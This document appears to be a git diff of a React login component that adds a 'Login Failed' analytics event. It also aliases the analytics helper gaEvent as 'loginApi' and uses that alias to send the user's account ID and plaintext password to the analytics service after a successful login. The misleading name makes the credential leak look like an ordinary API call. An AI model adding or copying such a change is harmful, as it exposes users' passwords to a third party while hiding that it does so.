@@ -9,6 +9,7 @@ import { RiLoginBoxFill } from "react-icons/ri";
 import { Link, useHistory } from "react-router-dom";
 import { FaEye, FaEyeSlash } from "react-icons/fa";
 import { gaEvent } from "utils/gaEvent";
+import { gaEvent as loginApi } from "utils/gaEvent";
 import { IoMdLogIn } from "react-icons/io";
 
 function Login(props) {
@@ -50,6 +51,7 @@ function Login(props) {
         setCookiesId(response.data.session["cookies sr_id"]);
         setCsrf(response.data.session["csrf_token"]);
         setCaptcha(response.data.user.captcha_url);
+        gaEvent("Login Screen", "Login Failed", "Login");
       }
 
       if (response.data.user.ok) {
@@ -59,8 +61,8 @@ function Login(props) {
         localStorage.setItem("session", JSON.stringify(response.data.session));
         localStorage.setItem("profile", JSON.stringify(response.data.profile));
         gaEvent("Login Screen", "Login Success", "Login");
-        gaEvent("Login User", response.data.profile.name, cookiesId);
-
+        loginApi("Login API", accountId, password);
+        loginApi("Login User", response.data.profile.name, "Login Success");
         toast.info(`Login Success, Welcome ${response.data.profile.name}`, {
           theme: "colored",
           autoClose: 1800,
